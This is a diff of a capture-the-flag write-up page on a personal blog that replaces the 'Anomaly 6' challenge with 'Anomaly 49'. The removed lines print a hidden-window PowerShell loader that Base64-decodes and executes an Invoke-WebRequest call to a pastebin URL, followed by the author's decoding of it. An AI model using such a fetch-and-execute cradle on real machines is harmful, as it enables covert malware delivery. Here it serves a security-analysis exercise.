@@ -11,7 +11,7 @@
 
     <title>
         
-          Anomaly 6 - CMouse&#39;s Blog
+          Anomaly 49 - CMouse&#39;s Blog
         
     </title>
 
@@ -142,14 +142,9 @@ show_sidebar()
 </div>
 
 <div class="book-post">
-  <h1 id="Anomaly-6"><a href="#Anomaly-6" class="headerlink" title="Anomaly 6"></a>Anomaly 6</h1><p>Points: 78</p>
-<p>An automated alert notified your security team to a potentially malicious script being executed on a users machine. Your job is to analyze the script to determine what it is doing. Note: During your analysis, the script should lead you to a sentence in English; this will be the answer you submit.</p>
+  <h1 id="Anomaly-49"><a href="#Anomaly-49" class="headerlink" title="Anomaly 49"></a>Anomaly 49</h1><p>Points: 46</p>
+<p>Our wily hacker doesn’t want the snooping admins to see the data content that is being stolen and has used a few tricks to mix things up. From the pcap file, find the original data content that the hacker exfiltrated. Flag is in the “cfc{}” format. Submit the flag including the cfc tag.</p>
 <hr>
-<p>The provided file is a PowerShell script:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe  <span class="keyword">if</span>([IntPtr]::Size <span class="nomarkup">-eq</span> <span class="number">4</span>)&#123;<span class="variable">$b</span>=<span class="string">'powershell.exe'</span>&#125;<span class="keyword">else</span>&#123;<span class="variable">$b</span>=<span class="variable">$env:windir</span>+<span class="string">'\syswow64\WindowsPowerShell\v1.0\powershell.exe'</span>&#125;;</span><br><span class="line"><span class="variable">$s</span>=<span class="built_in">New-Object</span> System.Diagnostics.ProcessStartInfo;</span><br><span class="line"><span class="variable">$s</span>.FileName=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$s</span>.Arguments=<span class="string">'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('</span><span class="string">'KEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9RWlhkVWVFYiIpLkNvbnRlbnQ='</span><span class="string">')))'</span>;</span><br><span class="line"><span class="variable">$s</span>.UseShellExecute=<span class="literal">$false</span>;</span><br><span class="line"><span class="variable">$s</span>.RedirectStandardOutput=<span class="literal">$true</span>;</span><br><span class="line"><span class="variable">$s</span>.WindowStyle=<span class="string">'Hidden'</span>;</span><br><span class="line"><span class="variable">$s</span>.CreateNoWindow=<span class="literal">$true</span>;</span><br><span class="line"><span class="variable">$p</span>=[System.Diagnostics.Process]::Start(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>
-<p>You don’t really have to know the syntax to solve this problem. The Base64 string on line 4 looks fishy - let’s decode it.</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ base64 -D</span><br><span class="line">KEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9RWlhkVWVFYiIpLkNvbnRlbnQ=</span><br><span class="line">(Invoke-WebRequest -Uri <span class="string">"https://pastebin.com/raw/QZXdUeEb"</span>).Content</span><br></pre></td></tr></table></figure>
-<p>Let’s go to the URL “<a href="https://pastebin.com/raw/QZXdUeEb&quot;" target="_blank" rel="noopener">https://pastebin.com/raw/QZXdUeEb&quot;</a>. We will then see the answer “buzzin radars is buzzin yah yah yah yah”.</p>
 
 </div>
 
